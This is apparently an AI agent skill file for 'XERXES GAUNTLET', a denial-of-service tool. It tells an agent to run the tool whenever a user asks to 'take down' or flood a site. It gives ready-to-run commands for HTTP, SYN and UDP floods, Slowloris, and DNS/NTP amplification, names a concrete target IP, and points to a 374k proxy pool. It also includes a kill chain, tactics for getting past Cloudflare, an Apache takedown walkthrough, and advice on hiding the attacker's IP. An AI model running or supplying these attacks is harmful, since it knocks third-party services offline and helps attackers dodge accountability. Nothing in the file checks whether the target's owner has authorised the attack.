---
name: xerxes-network-assault
description: This skill should be used when the user asks to "run xerxes", "ddos tool", "stress test website", "flood attack", "test network resilience", "xerxes gauntlet", "take down site", "bikin website down", "proxy flood", "amplification attack", "syn flood", "udp flood", "slowloris", "http flood", "multi-vector attack", "coba tes web sampe down", "ganas", "proxy dari supabase", "375k proxy", or mentions "xerxes-omni.py", "xerxes omni", or "gauntlet".
version: 6.0.0
---

## Tool Overview

XERXES GAUNTLET v6.0 is a full-spectrum Network Resilience Diagnostic Suite with 6 attack vectors and integrated proxy system. Location: `D:\xerxes-omni.py`

### Core Capabilities

| Vector | Type | Description |
|--------|------|-------------|
| **HTTP Flood** | Layer 7 | Proxy-graded HTTP flood with 374k+ proxy pool from Supabase |
| **SYN Flood** | Layer 4 | Quantum TCP SYN with exotic options (needs admin/root) |
| **UDP Flood** | Layer 4 | Spoofed UDP flood with random payload (needs admin/root) |
| **Slowloris** | Layer 7 | Connection starvation with partial HTTP requests |
| **DNS Amplification** | Layer 3 | ANY query via open resolvers, ~50x amplification |
| **NTP Amplification** | Layer 3 | Monlist request, ~200x amplification |

### Proxy System

- **Source**: Supabase Edge Function (`fetch-proxies`) — 374k+ proxy pool
- **Types**: HTTP, SOCKS4, SOCKS5
- **Selection**: Quality-weighted random rotation
- **Auto-refresh**: Fetches fresh proxies when pool runs low
- **Fallback**: Falls back to direct requests when proxies die (unless `--force-proxy`)

### Key Features

- **Cache Busting**: Random query params per request
- **Random Paths**: 100+ auto-generated URL paths
- **Browser Fingerprinting**: Chrome, Firefox, Safari, Mobile variants
- **Header Randomization**: Sec-CH-UA, Sec-Fetch-*, random Accept, random Referer
- **SOCKS Support**: Via `aiohttp_socks.ProxyConnector` when available
- **Auto Fallback**: Direct HTTP when proxy pool exhausted

---

## Quick Start

### Prerequisites

```bash
pip install aiohttp aiohttp-socks
```

### Basic HTTP Flood

```bash
python D:\xerxes-omni.py -m http -u https://target.com --concurrent 500 --duration 60
```

### Fast Start (Skip Proxy Validation)

```bash
python D:\xerxes-omni.py -m http -u https://target.com --no-proxy-validate --concurrent 800
```

### Multi-Vector Attack

```bash
python D:\xerxes-omni.py -m all -u https://target.com --with-amp --duration 120
```

### Full Nuclear (All Vectors)

```bash
python D:\xerxes-omni.py -m all -u https://target.com --with-amp --with-syn --concurrent 1000 --duration 300
```

### Layer 4 Only (Needs Admin/Root)

```bash
# SYN flood
python D:\xerxes-omni.py -m syn -t 103.179.72.188 -p 80 --threads 20

# UDP flood
python D:\xerxes-omni.py -m udp -t 103.179.72.188 -p 80 --threads 20

# Amplification
python D:\xerxes-omni.py -m amp -t 103.179.72.188 --amp-dns --amp-ntp --amp-threads 100
```

### Slowloris

```bash
python D:\xerxes-omni.py -m slowloris -t 103.179.72.188 -p 80 --sockets 500
```

---

## Arguments Reference

### Target
| Arg | Default | Description |
|-----|---------|-------------|
| `-t / --target` | — | Target IP address |
| `-p / --port` | 80 | Target port |
| `-u / --url` | — | Target URL (required for HTTP mode) |
| `-m / --mode` | http | Attack mode: syn, udp, http, slowloris, amp, all |

### HTTP Flood
| Arg | Default | Description |
|-----|---------|-------------|
| `--concurrent` | 500 | Concurrent HTTP workers through proxies |
| `--http-method` | GET | GET or POST |
| `--duration` | 60 | Test duration in seconds |
| `--no-cache-bust` | — | Disable cache busting query params |
| `--no-random-paths` | — | Use only root path (/) |

### Proxy & Safety
| Arg | Default | Description |
|-----|---------|-------------|
| `--proxy-limit` | 300 | Max proxies to fetch from API |
| `--proxy-min-quality` | 60 | Minimum quality score (0-100) |
| `--proxy-max` | 150 | Max proxies in active pool |
| `--no-proxy-validate` | — | Skip proxy validation (faster startup) |
| `--force-proxy` | — | **SAFE MODE** — Only proxy, NO direct fallback. Hides your IP |

### Amplification
| Arg | Default | Description |
|-----|---------|-------------|
| `--with-amp` | — | Enable all amplification |
| `--amp-dns` | — | DNS amplification only |
| `--amp-ntp` | — | NTP amplification only |
| `--amp-threads` | 50 | Amplification worker threads |

### Legacy
| Arg | Default | Description |
|-----|---------|-------------|
| `--with-syn` | — | SYN flood (needs admin/root) |
| `--with-udp` | — | UDP flood (needs admin/root) |
| `--threads` | 10 | Threads for SYN/UDP |
| `--size` | 1500 | UDP packet size |
| `--sockets` | 200 | Slowloris sockets |

---

## Attack Strategy Guide

### Target Classification

**Apache (No WAF)** — Most vulnerable
```
Strategy: 300-500 concurrent direct HTTP flood
Apache MPM default MaxRequestWorkers=256 → exhaust with keep-alive
```

**Nginx (+ Cloudflare)** — Moderate protection
```
Strategy: Proxy-graded HTTP flood with cache busting
Need to bypass CDN → find origin IP first
Use 500-1000 workers through proxy pool
```

**Cloudflare Challenge** — High protection
```
Strategy: Proxy rotation + cookie clearance
Origin IP discovery → attack origin directly
JS challenge solver needed for bypass
```

### Kill Chain

1. **Recon** — Check server type, WAF, response time
2. **Proxy Fetch** — Get proxies from Supabase API
3. **HTTP Flood** — Primary weapon, exhaust connection pool
4. **Sustain** — Keep connections alive, prevent recovery
5. **Multi-Vector** — Add SYN/UDP/AMP for distributed pressure

### Performance Tuning

- **Low bandwidth** (< 10 Mbps): Use `--concurrent 200`
- **Medium bandwidth** (10-100 Mbps): Use `--concurrent 500`
- **High bandwidth** (100+ Mbps): Use `--concurrent 1000-2000`
- **Direct attack** (no proxy): Higher concurrency, pure socket flooding
- **Proxy attack** (with proxy pool): Lower concurrency, IP rotation

### ⚠️ Safety — Hide Your IP

**ALWAYS use `--force-proxy` unless you explicitly want direct exposure:**
```bash
# SAFE — IP lo ga bakal kelihatan
python D:\xerxes-omni.py -m http -u https://target.com --force-proxy --no-proxy-validate

# UNSAFE — IP lo bakal kelihatan kalo proxy pool abis
python D:\xerxes-omni.py -m http -u https://target.com
```

Without `--force-proxy`, the tool warns at startup and falls back to **direct HTTP requests** when the proxy pool is exhausted. This means YOUR real IP hits the target server directly.

**Layered anonymity (recommended):**
```
[Lo] → [VPN] → [Proxy Pool 374k] → [Target]
```
- VPN encrypts traffic from ISP
- Proxy pool rotates IP per request  
- Target sees proxy IPs only

---

## Internal Architecture

### File Location
```
D:\xerxes-omni.py           — Main tool (~1400 lines)
Imports: aiohttp, aiohttp-socks (optional), socket, threading, asyncio
```

### Core Classes

| Class | Function |
|-------|----------|
| `Proxy` | Dataclass for proxy info with quality weight calculation |
| `ProxyFetcher` | Fetch proxies from Supabase API endpoint |
| `ProxyRotator` | Quality-weighted rotation with auto-refresh |
| `ProxyHTTPFlood` | Async HTTP flood through proxies with fallback |
| `DNSAmplifier` | DNS ANY query amplification |
| `NTPAmplifier` | NTP monlist amplification |
| `OmnipotentSYNFlood` | Raw socket SYN flood |
| `OmnipotentUDPFlood` | Raw socket UDP flood |
| `OmnipotentSlowloris` | Connection starvation attack |
| `GauntletMultiVector` | All-vector orchestrator with RealityShiftDaemon |
| `RealityShiftDaemon` | Monitors vectors, shifts to most effective |

### Global Stats
```python
stats = {
    "packets_sent": 0, "bytes_sent": 0, "connections_opened": 0,
    "errors": 0, "running": True, "requests_done": 0,
    "proxy_rotations": 0, "amplification_factor": 0,
}
```

### Proxy API (Supabase)
```python
PROXY_API_URL = "https://vwmhbpgwhfwuwtattset.supabase.co/functions/v1/fetch-proxies"
PROXY_API_KEY =  # Bearer token for auth
```
Returns: `{ success, count, totalAvailable, proxies, fetchedAt }`
Each proxy: `{ ip, port, type, country, responseTime, qualityScore, anonymity }`

---

## Example Walkthrough

### Taking Down Apache Server

This is the proven attack pattern against Apache/2.4.6 (CentOS):

```bash
# Step 1: Quick recon
curl -I http://target.com/old/

# Step 2: Proxy HTTP flood — exhaust connection pool
python D:\xerxes-omni.py -m http -u http://target.com/old/ --concurrent 300 --no-proxy-validate --duration 60

# Step 3: If server still up — occupy Apache workers (Slowloris-style)
# Use raw socket flood with partial GET requests
# Hold connections open to keep MaxRequestWorkers saturated

# Step 4: Check target
curl -I http://target.com/old/  # Should return 503 / timeout
```

### Using Proxy Pool

```bash
# With validation (slower startup, better proxy quality)
python D:\xerxes-omni.py -m http -u https://target.com --proxy-limit 500 --proxy-min-quality 70

# Without validation (fastest startup)
python D:\xerxes-omni.py -m http -u https://target.com --no-proxy-validate

# Force proxy only (no direct fallback)
python D:\xerxes-omni.py -m http -u https://target.com --concurrent 200 --no-proxy-validate
```

---

## Notes

- SYN/UDP/Amplification modes require **admin/root** on Windows/Linux for raw sockets
- HTTP flood mode works without admin rights
- Proxy pool auto-refreshes every 120 seconds from Supabase
- Free proxies (quality < 70) have high failure rate; use `--proxy-min-quality 80` for better results
- The tool's default proxy API key is embedded in the script
- All attack statistics are logged to `xerxes_gauntlet_*.log`
